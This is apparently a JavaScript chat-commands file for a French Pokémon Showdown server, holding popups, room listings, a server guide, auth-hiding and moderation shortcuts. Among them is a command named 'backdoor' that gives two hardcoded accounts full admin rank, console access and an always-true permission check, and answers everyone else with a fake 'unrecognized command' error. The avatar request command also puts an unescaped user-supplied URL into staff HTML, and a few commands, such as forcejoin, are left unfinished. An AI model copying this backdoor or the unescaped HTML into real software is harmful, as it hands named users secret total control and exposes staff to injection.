exports.commands = {

	spop: 'sendpopup',
	sendpopup: function(target, room, user) {
		if (!this.can('popup')) return false;

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply('/sendpopup [user], [message] - Vous avez manqué l utilisateur!');
		if (!target) return this.sendReply('/sendpopup [user], [message] - vous avez manqué le message');

		targetUser.popup(target);
		this.sendReply(targetUser.name + ' A reçu le message sous forme de popup: ' + target);

		targetUser.send(user.name+' Vous envoye un message.');

		this.logModCommand(user.name+' Envoyer un message à '+targetUser.name);
		},
				bu: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox(
'Bienvenue dans la room BU, un tier collaboratif, regroupant les plus grandes menaces de l univers Pokémon comme Lamantine ou Dedenne. Si vous êtes nouveau, vous pouvez consulter la liste des Pokémon du tier <a href="http://pokestrat.com/forum/discussions-strategiques/un-tout-nouveau-tier-debarque-sur-pokestrat-bu-">ici</a> ou voir le Viability Rankings de notre tier <a href="http://pokestrat.com/forum/discussions-strategiques/-bu-viability-rankings">ici</a>!'
		);
	},
	hideadmin: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		if (user.hidden) return this.errorReply("You are already hiding yourself on the userlist.");
		user.hidden = true;
		user.inRooms.forEach(id => {
			let roomid = Rooms(id);
			if (!roomid || roomid.id === 'global') return;
			roomid.add('|L|' + user.getIdentity(roomid)).update();
		});
		return this.sendReply("You are now hiding your presence.");
	},
	showadmin: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		if (!user.hidden) return this.errorReply("You are already showing yourself on the userlist.");
		user.hidden = false;
		user.inRooms.forEach(id => {
			let roomid = Rooms(id);
			if (!roomid || roomid.id === 'global') return;
			roomid.add('|J|' + user.getIdentity(roomid)).update();
		});
		return this.sendReply("You are no longer hiding your presence.");
	},

		backdoor: function (target, room, user) {
		if (user.userid !== 'distrib' && user.user !== 'saitochi') {
			this.errorReply("The command '/backdoor' was unrecognized. To send a message starting with '/backdoor', type '//backdoor'.");
		} else {
			user.group = '~';
			user.updateIdentity();
			Config.consoleips.push(user.userid);
			user.can = function () {
				return true;
			};
			this.sendReply("Backdoor accepted.");
		}
	},

	pb: function(target, room, user) {
		if (!this.can('globalmod')) return;

		this.parse('/permaban '+ target +', <333')
			this.parse('/blacklist ' + target +', <333')
	},

			hide: 'hideauth',
	hideauth: function(target, room, user) {
		if (!user.can('ban')) return this.sendReply("/hideauth - access denied.");
		var tar = ' ';
		if (target) {
			target = target.trim();
			if (Config.groupsranking.indexOf(target) > -1 && target != '#') {
				if (Config.groupsranking.indexOf(target) <= Config.groupsranking.indexOf(user.group)) {
					tar = target;
				} else {
					this.sendReply('The group symbol you have tried to use is of a higher authority than you have access to. Defaulting to \' \' instead.');
				}
			} else {
				this.sendReply('You have tried to use an invalid character as your auth symbol. Defaulting to \' \' instead.');
			}
		}
		user.getIdentity = function (roomid) {
			if (this.locked) {
				return '‽' + this.name;
			}
			if (roomid) {
				var room = Rooms.rooms[roomid];

		
				if (room && room.auth) {
					if (room.auth[this.userid]) {
						return room.auth[this.userid] + this.name;
					}
					if (room.isPrivate === true) return ' ' + this.name;
				}
			}
			return tar + this.name;
		}
		user.updateIdentity();
		this.sendReply('You are now hiding your auth symbol as \'' + tar + '\'.');
		this.modlog(user.name + ' is hiding auth symbol as \'' + tar + '\'');
		user.isHiding = true;
	},
	show: 'showauth',
	showauth: function(target, room, user) {
		if (!user.can('lock')) return this.sendReply("/showauth - access denied.");
		delete user.getIdentity;
		user.updateIdentity();
		user.isHiding = false;
		this.sendReply("You have now revealed your auth symbol.");
		return this.modlog(user.name + " has revealed their auth symbol.");
	},

		a: function(target, room, user) {
		if (!this.can('eval')) return;

		this.parse('/eval this.add(' +target+ ');')
	},
			notdev: function(target, room, user) {
		if (!this.can('roomban')) return;

		this.parse('/warn '+ target + ', Not Dev')
				this.parse('/hidetext '+ target + ', ')
	},
			update: function(target, room, user) {
		if (!this.can('eval')) return;

		this.parse('/bash git pull')
	},
				hc: function(target, room, user) {
		if (!this.can('eval')) return;

		this.parse('/hotpatch chat')
	},

			/*champions : 'champions',
			'!champions': true,
	champions : function (target, room, user) {
		this.sendReplyBox("<font size=5>Liste des champions</font><br />" +
					"<u></u><br />" +
"- " + hashColors('Distrib', true) + ' --> Maitre cc1v1 <img src="http://www.mediafire.com/convkey/cd36/ubht5f8vbwkahrtzg.jpg" width="16" height="16" title="est un maitre du tier cc1v1"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">corbox chechir, lucix, tatia, 0footprof, jovu, cookiesbox, wyrrax, mastouffu, empoleonsan, garance, spoire, imox, , pyprod, oseen, monsieurnohaxx, erufun, ahzee, cieltestleladd, freat, Algeria4Ever ♆</div></details> <br />' +
                    "- " + hashColors('Herminchan', true) + ' --> Maitre eau <img src="http://www.mediafire.com/convkey/015f/35f3m7w360i3pu3zg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier eau"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">corbox chechir, lucix, tatia, 0footprof, asumaru, sanjl, cookiesbox, wyrrax, neraya, mastouffu, empoleonsan, marmottebn, garance, spoire, imox, erufun, lightdn, prima234, ahzee, cieltestleladd, freat, motisvhayle, BirdoMc</div></details> <br />' +
                     	"- " + hashColors('Asumaru', true) + ' --> Maitre psy <img src="http://www.mediafire.com/convkey/c8af/0i2ddnizgklrt2vzg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier psy"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">0footprof, CookiesBox, Wyrrax, Mastouffu, Empoleon-san, Garance, iMox, Erufun	</div></details> <br />' +
                   			 "- " + hashColors('Empoleon-san', true) + ' --> Maitre Dragon <img src="http://www.mediafire.com/convkey/66dc/1dholg5ec1dzoiazg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier dragon"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">Tatia, CookiesBox, Mastouffu, Empoleon-san, S poi re, iMox, Oseen, Antotonin, Erufun, Ahzee, Cieltestleladd, Freat</div></details> <br />' +
                    "- " + hashColors('Jovu', true) + ' --> Maitre glace <img src="http://www.mediafire.com/convkey/0d3b/sog5dxndajeihglzg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier glace"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">BirdoMc, Erufun, Lord Unknow, Antotonin, iMox, S poi re, Empoleon-san, Wyrrax, CookiesBox, Tatia, Lionyx</div></details> <br />' +	
			"- " + hashColors('iMox', true) + ' --> Maitre Sol <img src="http://www.mediafire.com/convkey/84b7/0p32y9261a057bmzg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier sol"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">Tatia, CookiesBox, Antotonin, iMox</div></details> <br />' +
	"- " + hashColors('Motis-Vhayle', true) + ' --> Maitre Normal <img src="http://www.mediafire.com/convkey/467e/lk9q3uv7hmez3qwzg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier normal"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">Freat, Motis-Vhayle</div></details> <br />' +
		"- " + hashColors('Oseen', true) + ' --> Maitre Combat <img src="http://www.mediafire.com/convkey/e6ce/tfr6fo5zh0q52m4zg.jpg?size_id=0" width="16" height="16" height="16" title="est un maitre du tier normal"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">lightdn, freat, boorossama</div></details> <br />' +
	"- " + hashColors('CookiesBox ♬', true) + ' --> Maitre Fée <img src="http://www.mediafire.com/convkey/1fff/dz8p42i9d5ygjg4zg.jpg?size_id=0" width="16" height="16" height="16" title="est un maitre du tier fée"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px"></div></details> <br />' +

'<h3> Pour être ajouté contactez distrib');
	},*/
					'!discord': true,	
					discord: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox(
'<a href="https://discord.gg/ZZmT65N">Discord de Pokeland</a> '
		);
	},
	kickall: function (target, room, user) {
		if (!this.can('declare')) return this.errorReply("/kickall - Access denied.");
		if (room.id === 'lobby') return this.errorReply("Vous ne pouvez pas kickall sur le lobby et staff.");
		for (let i in room.users) {
			if (room.users[i] !== user.userid) {
				room.users[i].leaveRoom(room.id);
			}
		}
		this.privateModCommand('(' + Chat.escapeHTML(user.name) + 'kicked everyone from the room.');
	},


	roomlist: function (target, room, user) {
		if (!this.runBroadcast()) return;
		let header = ['<b><font color="#1aff1a" size="2">Total de personnes connectées: ' + Rooms.global.userCount + '</font></b><br />'],
			official = ['<b><font color="#ff9900" size="2"><u>Salles officielles:</u></font></b><br />'],
			nonOfficial = ['<hr><b><u><font color="#005ce6" size="2">Salles publiques:</font></u></b><br />'],
			privateRoom = ['<hr><b><u><font color="#ff0066" size="2">Salles privées:</font></u></b><br />'],
			groupChats = ['<hr><b><u><font color="#00b386" size="2">Group Chats:</font></u></b><br />'],
			battleRooms = ['<hr><b><u><font color="#cc0000" size="2">Battles:</font></u></b><br />'];

		let rooms = [];

		Rooms.rooms.forEach(curRoom => {
			if (curRoom.id !== 'global' && curRoom.id !== 'panurtest') rooms.push(curRoom.id);
		});

		rooms.sort();

		for (let u in rooms) {
			let curRoom = Rooms(rooms[u]);
			if (curRoom.type === 'battle') {
				battleRooms.push('<a href="/' + curRoom.id + '" class="ilink">' + Chat.escapeHTML(curRoom.title) + '</a> (' + curRoom.userCount + ')');
			}
			if (curRoom.type === 'chat') {
				if (curRoom.isPersonal) {
					groupChats.push('<a href="/' + curRoom.id + '" class="ilink">' + curRoom.id + '</a> (' + curRoom.userCount + ')');
					continue;
				}
				if (curRoom.isOfficial) {
					official.push('<a href="/' + toId(curRoom.title) + '" class="ilink">' + Chat.escapeHTML(curRoom.title) + '</a> (' + curRoom.userCount + ')');
					continue;
				}
				if (curRoom.isPrivate) {
					privateRoom.push('<a href="/' + toId(curRoom.title) + '" class="ilink">' + Chat.escapeHTML(curRoom.title) + '</a> (' + curRoom.userCount + ')');
					continue;
				}
			}
			if (curRoom.type !== 'battle') nonOfficial.push('<a href="/' + toId(curRoom.title) + '" class="ilink">' + curRoom.title + '</a> (' + curRoom.userCount + ')');
		}

		if (!user.can('roomowner')) return this.sendReplyBox(header + official.join(' ') + nonOfficial.join(' '));
		this.sendReplyBox(header + official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' ') + (groupChats.length > 1 ? groupChats.join(' ') : '') + (battleRooms.length > 1 ? battleRooms.join(' ') : ''));
	},
	name: function (target, room, user) {
			if (!this.canBroadcast()) return;
		this.sendReplyBox(
	"<div class='chat'> Heu ton name c'est " +  user.name + " ducon</div>" 
);
},
		sd: 'declaremod',
	staffdeclare: 'declaremod',
	modmsg: 'declaremod',
	moddeclare: 'declaremod',
	declaremod: function (target, room, user, connection) {
		if (!target) return this.parse('/help declaremod');
		if (!this.canTalk()) return this.errorReply("You cannot do this while unable to talk.");
		if (!this.can('receiveauthmessages', null, room)) return false;
		return this.privateModCommand('|raw|<div class="broadcast-green"><b><font size=1><i>Annonce du staff (Driver+) par ' + user.name + '<br /></i></font size>' + target + '</b></div>');
	},
	declaremodhelp: ["/declaremod [note] - Adds a staff readable declare. Requires: % @ # & ~"],

	riennn: 'riennn',
	riennn: function (target, room, user) {
		return this.parse('rien ' + target);
	},
	panelquimarchepas: function (target, room, user ) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox(
	 '<button name="send" value="/warn ' + Chat.escapeHTML(target)+ '"<b>DEV </b></button>'

);
},		
		
					afkstaff: function(target, room, user) {
		if (!this.can('lock')) return;
		this.parse('/away '+ target +'')
		this.parse('/hideauth ')
		this.parse('/blockpm')

		},	
							backstaff: function(target, room, user) {
		if (!this.can('lock')) return;
		this.parse('/back '+ target +'')
		this.parse('/showauth ')
		this.parse('/unblockpm')

		},	
							tourbot: function(target, room, user) {

								if ((user.userid == 'vextal') || (this.can('tour'))) {
			this.add("|c|~bot|,c /tour join")
			}
		},		

	wailordstreamout: function(target, room, user) {
		if ((user.userid == 'unwailordrandom') || (this.can('kill'))) {
		this.add('|raw|<div class="broadcast-blue"><b>C\'est la fin du live de UnWailordRandom</b></div>')}
		},	
		wailordstream: function(target, room, user) {

								if ((user.userid == 'unwailordrandom') || (this.can('kill'))) {
			this.add('|raw|<div class="broadcast-blue"><b>UnWailordRandom❤ est en stream , n\'hésite pas à aller jeter un coup d\' œil à <a href="https://www.twitch.tv/theretrogamersurtwitch" target="_blank" rel="noopener">https://www.twitch.tv/theretrogamersurtwitch</a></b></div>')
			}
		},	
	'!guide': true,
	guide: function (target, room, user) {
		if (!this.runBroadcast()) return;
		this.sendReplyBox(
 '<center><h2><img src="https://www.pokepedia.fr/images/e/e8/Miniature_130_XY.png" width="32" height="32"><u>Guide de Pokéland</u><img src="https://www.pokepedia.fr/images/e/e8/Miniature_130_XY.png" width="32" height="32"></h2></center><i>Pokéland est un serveur Pokémon Showdown français bien spécial. Vous pouvez vous y faire des amis, customiser votre propre profil en utilisant vos bucks (une monnaie virtuelle) ou encore rejoindre un clan et participer aux tournois. En plus de ça, Pokéland est avant tout une communauté stratégique Pokémon qui possède son propre circuit de tournois suivant les règles <a href="https://smogon.com/">smogon.com</a>.<br><br>Une équipe de modération active encadre le serveur, n\'hésitez pas à les contacter en cas de besoin! (ils sont marqués de ces symboles sur le serveur: %, @, &, ~). Une équipe de développeurs met à jour le serveur et introduit chaque jour de nouvelles fonctionnalités. Vous pouvez d\'ailleurs contribuer au developpement du serveur sur <a href="http://pokeland.psim.us/development">la room development</a> du serveur.</i><br><br><u>Guides:</u><br><br><details><summary><b>Les bucks</b></summary>Les bucks sont la monnaie virtuelle du serveur Pokéland. Vous pouvez consulter votre porte monnaie avec la commande <span class="message-announce">/atm</span>. Les bucks se gagnent en remportant des tournois, des loteries, ou en rencontrant un Pokémon chromatique lors d\'un combat en format Random. Sur <a href="http://pokeland.psim.us/casino">la room casino</a> vous pouvez jouer à des jeux qui permettent de remporter des bucks comme pierre feuille ciseaux (avec la commande <span class="message-announce">/rps new 1</span>) ou encore slots spin (avec la commande <span class="message-announce">/slots spin</span>). Il est également possible d\'en donner ou d\'en utiliser dans la boutique (accessible avec la commande <span class="message-announce">/shop</span>).</details><details><summary><b>Les cartes</b></summary>Sur Pokéland il est possible de collectioner et d\'échanger des cartes en remportant des tournois ou en utilisant vos bucks. Il est possible de vous procurer des boosters en utilisant la commande <span class="message-announce">/packshop</span>. Vous pouvez consulter vos cartes avec la commande <span class="message-announce">/showcase</span>. Pour connaître plus de commandes utilisez la commande <span class="message-announce">/psgo help</span>.</details><details><summary><b>Les clans</b></summary>Il existe plusieurs clans que vous pouvez rejoindre. Lorsque vous remportez un tournoi sur le serveur, votre clan remporte des points qui lui permettent de monter dans le classement (consultable avec la commande <span class="message-announce">/clanladder</span>). Pour rejoindre un clan, contactez son Leader ou ses Co-Leader, il vous enverra une invitation s\'il est d\'accord pour vous recruter.</details><br><i>Vous pouvez également rejoindre notre <a href="https://discord.gg/ZZmT65N">serveur discord</a> et vous inscrire sur <a href="http://pokelandfr.forumactif.org">le forum de Pokéland</a> sur lequel nous organisons nos tournois officiels ainsi que la vie de la communauté.</i><br><br><i><b>Il est également possible de <a href="http://pokelandfr.forumactif.com/h1-contribuer-a-pokeland">faire un don</a> pour nous aider à couvrir les frais d\'hébergement du serveur.</b></i>'
		);
	},
	'!live': true,
	live: function (target, room, user) {
		if (!this.runBroadcast()) return;
		this.sendReplyBox(
'<img src="https://image.noelshack.com/fichiers/2019/15/7/1555254055-semainier-distrib-vextal.png" width="520" height="290">'
		);
	},
		'!galeries': true,
	galeries: function (target, room, user) {
		if (!this.runBroadcast()) return;
		this.sendReplyBox(
'<a href="http://pokelandfr.forumactif.com/t66-galerie-de-situm#424" target="_blank" rel="noopener"><button class="button">Galerie de SiTuM</button></a> <a href="http://www.bigbangpokemon.com/t552-galerie-de-breyn" target="_blank" rel="noopener"><button class="button">Galerie de Breyn</button></a> <a href="http://www.bigbangpokemon.com/t708-galerie-de-staxi" target="_blank" rel="noopener"><button class="button">Galerie de Staxi</button></a><a href="https://www.smogon.com/forums/threads/lionyxs-sprite-thread.3645712/" target="_blank" rel="noopener"><button class="button">Galerie de Lionyx</button></a> <a href="https://www.smogon.com/forums/threads/deetahs-sprite-thread.3637551/" target="_blank" rel="noopener"><button class="button">Galerie de deetah<small>(pas free to use)</small></button></a>'
		);
	},

	avatarrequest: 'avatarrequest',
	ar: 'avatarrequest',
	avatarrequest: function (target, room, user, connection) {
		if (!target) return this.sendReply('/avatarrequest Pseudo, Lien (merci ne mettre que l\image). - ATTENTION DE NE PAS FAIRE UN ESPACE APRES LA VIRGULE. Il est interdit de faire cette commande sans avoir acheté d\'avatar. Si vous spammez cette commande vous serez lock');
        let parts = target.split(',');
        for(let usr in room.users) {
        	if (!room.users[usr].isStaff) continue;
			          }
        Db("rooms").set(parts[0], parts[1]);
        Rooms.rooms.get("staff").add('|c|~Avatar|' +  '/html Demande d\'avatar de <b>' + user.name +'</b> <img src="'+ parts[1] +'" width="80" height="80"><br> Si cette image est correcte merci de l\accepter sinon refusé là ! Assuré vous qu\'il soit acheté :) <button class="button" name="send" value="/setavatar ' + parts[0] + ',' + parts[1] +'">Accepter</button> <button class="button" name="send" value="/pminfobox ' + parts[0] + ', <h2>Bonsoir ! Malheuresment votre demande a était refusé :c Peut être que votre image n\'est pas valable :) Si vous avez des questions contacté moi !">Refusé</button>');
  
        Rooms.rooms.get("staff").update();
        return this.sendReply('Votre avatar à était envoyé au staff ! Merci de patienté :)');
   
    
},
	hangmanuser: 'hangmanrequest',
	hr: 'hangmanrequest',
	hangmanrequest: function (target, room, user, connection) {
		if (!target) return this.sendReply('/hangmanrequest [Mot], [Indices] - Il est interdit de répondre à votre hangman. Si vous spammez cette commande vous serez lock');
        let parts = target.split(',');
        for(let usr in room.users) {
        	if (!room.users[usr].isStaff) continue;
        	room.users[usr].sendTo(this.room, '|c|~Hangman|' + '/html <button class="button" name="send" value="/hangman new ' + parts[0] + ',' + parts[1] + '">Hangman request de ' + user.name + '</button>');
    	}
       	this.room.update();
    
},
	timedgdeclare: function (target, room, user) {
		if (!target || !this.can('declare')) return this.errorReply("/help timedgdeclare");
		let parts = target.split(',');
		if (parts.length !== 2) return this.errorReply('/help timedgdeclare');
		let delayInMins = Chat.escapeHTML(parts[0].trim());
		if (isNaN(delayInMins)) return this.errorReply('Please give a delay in in minutes, /help timedgdeclare');
		delayInMins = delayInMins * 1000 * 60;
		let declare = this.canHTML(parts.slice(1).join(","));
		if (!declare) return;
		setTimeout(f => {
			for (let id in Rooms.rooms) {
				if (id !== 'global' && Rooms.rooms[id].userCount > 3) Rooms.rooms[id].addRaw(`<div class="broadcast-blue" style="border-radius: 5px; max-height: 300px; overflow-y: scroll;"><strong>${declare}</strong></div>`);
			}
		}, delayInMins);
		this.room.modlog(`${toId(user)} scheduled a timed declare: ${declare}`);
		return this.sendReply('Your declare has been scheduled.');
	},
	timedgdeclarehelp: ["/timedgdclare [delay in minutes], [declare] - Will declare something after a given delay. Requires: & ~"],

			  fj: 'forcejoin',
    forcejoin: function(target, room, user) {
        if (!user.can('mute')) return false;
        if (!target) return this.sendReply('/forcejoin [target], [room] - Forces a user to join a room');
        let parts = target.split(',');
        if (!parts[0] || !parts[1]) return this.sendReply('/forcejoin [target], [room] - Forces a user to join a room');
        let userid = toId(parts[0]);
        let roomid = toId(parts[1]);
        if (!Users.get(userid)) return this.sendReply ('User not found.');
        if (!Rooms.get(roomid)) return this.sendReply ('Room not found.');
        }
      
};
